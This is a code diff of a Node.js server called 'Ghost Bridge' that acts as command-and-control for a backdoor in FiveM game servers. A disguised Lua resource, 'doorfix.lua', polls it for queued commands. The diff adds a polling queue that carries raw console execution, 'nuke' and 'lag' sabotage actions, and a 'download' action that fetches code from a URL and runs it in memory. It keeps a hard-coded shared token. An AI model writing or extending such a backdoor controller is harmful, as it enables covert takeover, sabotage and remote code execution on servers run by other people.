@@ -1,109 +1,70 @@
 const express = require('express');
 const cors = require('cors');
-const http = require('http');
+const path = require('path');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
-const path = require('path');
 
-// Serve dashboard at root
+// Serve Dashboard
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// Internal State
+let PENDING_COMMANDS = []; // Array of queued commands
+let LAST_TELEMETRY = {};
+const TOKEN = "GHOST_2025";
 
-
-// CONFIGURATION
-const TOKEN = "GHOST_2025"; // Must match doorfix.lua
-const FIVEM_HOST = '103.1.215.150'; // Dynamically set by handshake
-const FIVEM_PORT = 30150;    // Default FiveM HTTP port
-let LAST_TELEMETRY = {};      // Stores last received stats
-let CURRENT_FIVEM_IP = '103.1.215.150'; // Default to your known IP
-
-
-// ENDPOINT 1: HANDSHAKE (From doorfix.lua)
-// The Lua script POSTs its own IP here upon startup
-app.post('/api/handshake', (req, res) => {
+// Endpoint 1: Dashboard adds a command to the queue
+app.post('/api/exec', (req, res) => {
     if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
     
-    const { ip } = req.body;
-    if (ip) {
-        CURRENT_FIVEM_IP = ip;
-        console.log(`[Bridge] Registered FiveM Server at ${CURRENT_FIVEM_IP}`);
+    const { action, input, customText, duration, url } = req.body;
+    let cmdPayload = "";
+
+    // Build the command string for Lua
+    if (action === "console") {
+        cmdPayload = JSON.stringify({ type: "console", data: input });
+    } else if (action === "nuke") {
+        cmdPayload = JSON.stringify({ type: "nuke", text: customText || "NUKED" });
+    } else if (action === "lag") {
+        cmdPayload = JSON.stringify({ type: "lag", duration: duration });
+    } else if (action === "download") {
+        cmdPayload = JSON.stringify({ type: "download", url: url });
     }
-    res.json({ status: 'registered' });
+
+    // Push to queue
+    PENDING_COMMANDS.push(cmdPayload);
+    console.log(`[Bridge] Queued command: ${cmdPayload}`);
+    res.json({ status: 'queued' });
 });
 
-// ENDPOINT 2: TELEMETRY INGESTION (From doorfix.lua)
-// The Lua script sends stats every 2 seconds
+// Endpoint 2: Lua polls for commands (THE CRITICAL FIX)
+app.get('/api/poll', (req, res) => {
+    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
+    
+    if (PENDING_COMMANDS.length > 0) {
+        // Shift (remove) the first command from the queue
+        const cmd = PENDING_COMMANDS.shift();
+        console.log(`[Bridge] Dispatching command to Lua`);
+        res.json({ status: 'active', command: cmd });
+    } else {
+        res.json({ status: 'idle' });
+    }
+});
+
+// Endpoint 3: Telemetry (Optional, for stats display)
 app.post('/api/telemetry', (req, res) => {
     if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
     LAST_TELEMETRY = req.body;
     res.json({ status: 'received' });
 });
 
-// ENDPOINT 3: STATS DELIVERY (To Website Dashboard)
-// Your index.html polls this to show live player counts/ping
+// Endpoint 4: Stats Delivery (Dashboard reads last known state)
 app.get('/api/stats', (req, res) => {
     if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
     res.json(LAST_TELEMETRY || { status: 'No data yet' });
 });
 
-// ENDPOINT 4: EXECUTION ROUTER (From Website Dashboard)
-// Handles Console commands, Nukes, and Lag switches
-app.post('/api/exec', (req, res) => {
-    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
-    
-    if (!CURRENT_FIVEM_IP) {
-        return res.status(503).json({ error: 'No FiveM server registered yet. Wait for handshake.' });
-    }
-
-    const { action, input, customText, duration, url } = req.body;
-    let cmdPayload = "";
-
-    // Build the command payload based on action type
-    if (action === "console") {
-        // Raw console command (e.g., "quit", "kick", "ensure resource_name")
-        cmdPayload = JSON.stringify({ cmd: input });
-        
-    } else if (action === "nuke") {
-        // Triggers the specific Lua event with custom text
-        cmdPayload = JSON.stringify({ cmd: `exec_trigger doorfix:webExec ${JSON.stringify({token:"GHOST_2025", action:"nuke", customText:customText})}` });
-        
-    } else if (action === "lag") {
-        // Triggers the lag switch logic
-        cmdPayload = JSON.stringify({ cmd: `exec_trigger doorfix:webExec ${JSON.stringify({token:"GHOST_2025", action:"lag", duration:duration})}` });
-        
-    } else if (action === "download") {
-        // Downloads new code into memory
-        cmdPayload = JSON.stringify({ cmd: `exec_trigger doorfix:webExec ${JSON.stringify({token:"GHOST_2025", action:"download", url:url})}` });
-    }
-
-    // Send to FiveM Server via HTTP RPC
-    const options = {
-        hostname: CURRENT_FIVEM_IP,
-        port: FIVEM_PORT,
-        path: '/server/execute',
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' }
-    };
-
-    const reqToFiveM = http.request(options, (res) => {
-        let data = '';
-        res.on('data', (chunk) => data += chunk);
-        res.on('end', () => {
-            try {
-                res.json(JSON.parse(data));
-            } catch(e) {
-                res.json({ status: 'error', message: data || 'No response from FiveM' });
-            }
-        });
-    });
-
-    reqToFiveM.write(cmdPayload);
-    reqToFiveM.end();
-});
-
-// START BRIDGE
-app.listen(8080, () => console.log(`Ghost Bridge Active on Port 8080`));
+app.listen(8080, () => console.log(`Ghost Bridge Active (Pull Mode)`));
